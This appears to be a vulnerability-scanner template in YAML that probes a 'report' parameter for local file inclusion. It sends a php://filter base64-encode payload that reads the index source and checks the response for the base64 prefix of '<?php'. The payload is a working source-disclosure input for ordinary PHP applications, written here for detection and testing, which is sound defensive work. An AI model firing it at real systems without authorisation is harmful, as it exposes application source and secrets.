id: lfi6-1397
name: 'Traversal in report'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via report'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      report:
        - 'php://filter/convert.base64-encode/resource=index'
    matchers:
      - type: word
        part: body
        words:
          - 'PD9waHA'
